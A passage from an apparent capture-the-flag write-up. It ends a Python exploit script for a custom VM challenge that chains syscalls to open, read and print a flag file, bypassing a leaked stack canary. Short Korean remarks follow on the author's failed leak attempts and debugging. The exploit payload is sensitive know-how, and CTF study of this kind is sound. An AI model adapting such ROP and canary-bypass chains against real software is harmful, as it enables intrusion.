payload2 += int_to_str(0x1)
payload2 += int_to_str(0x64e)	# syscall open('flag'), check canary, pop r3 r2 r1 ret;

payload2 += int_to_str(canary)
payload2 += int_to_str(0x30)	# size
payload2 += int_to_str(0x1c000)	# buf
payload2 += int_to_str(0x2)		# fd
payload2 += int_to_str(0x60b)	# pop r0 ret;

payload2 += int_to_str(0x3) 	# sys_s3
payload2 += int_to_str(0x64e)	# syscall read(2, 0xc4000, 0x30), check canary, r3 r2 r1 ret;

payload2 += int_to_str(canary)
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x609)	# pop r1, r0 ret;

payload2 += int_to_str(0x30)	# size
payload2 += int_to_str(0x1c000)	# buf
payload2 += int_to_str(0x638)	# call write()

writing('AAAA', '\xff', payload2)	# 0xdd000


r.interactive()
```





# Comment

- 처음에는 null을 만나기 전까지 모든 것을 출력한다는 것에 기반하여 카나리 직전까지 입력을 주거나 메모리 할당 주소를 **canary** 근처로 바꿔, `edit()` 시 출력되는 `secret key`로 알아내려고 했습니다만, 메모리 접근 권한 문제로 **FAIL..**
- 카나리가 자꾸 틀려서 애를 좀 먹었다;; (으아니! 디버깅할 때 출력되는 문자열들 때문에 다른 문자열을 읽어들여서 자꾸 카나리가 이상하게 들어갔다) 
- **flag** 파일의 데이터를 버퍼에 저장할 때, **fd** 값을 **2**로 줘야댐! 요거 땜에 또 시간 썻당.. ㅎ
- 이제 **VM 문제**가 별로 두렵거나 하지는 않지만, 대신 구역질을 할 것 같다
